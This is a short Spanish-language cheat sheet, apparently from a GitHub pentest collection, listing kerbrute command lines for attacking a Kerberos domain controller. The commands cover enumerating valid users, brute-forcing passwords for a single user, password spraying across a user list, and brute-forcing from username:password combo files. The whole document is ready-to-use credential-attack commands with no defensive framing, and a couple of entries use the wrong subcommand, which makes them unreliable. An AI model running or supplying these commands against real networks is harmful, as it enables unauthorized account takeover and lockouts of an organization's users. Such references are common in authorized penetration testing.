# Kerbrute Cheat Sheet

#### Enumerar usuarios validos
```
kerbrute userenum --dc <IP-TARGET> -d <DOMAIN> <WORDLISTS>
```

#### Enumerar usuarios validos y guardar el resultado
```
kerbrute userenum --dc <IP-TARGET> -d <DOMAIN> -o <OUTPUT> <WORDLISTS>
```

#### Fuerza bruta de contraseñas a un usuario en particular
```
kerbrute bruteuser --dc <IP-TARGET> -d <DOMAIN> <FILE-PASSWORDS_LIST> <USER>
```

#### Fuerza bruta de una contraseña en particular a un listado de usuarios
```
kerbrute bruteuser --dc <IP-TARGET> -d <DOMAIN> <FILE-USERNAME_LIST> <PASSWORD>
```

#### Password Spraying
```
kerbrute passwordspray --dc <IP-TARGET> -d <DOMAIN> <FILE-USERNAME_LIST> <PASSWORD>
```

#### Fuerza bruta desde un archivo con un listado con formato username:password
```
kerbrute bruteuser --dc <IP-TARGET> -d <DOMAIN> <FILE-USERNAME_PASSWORD_LIST>
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)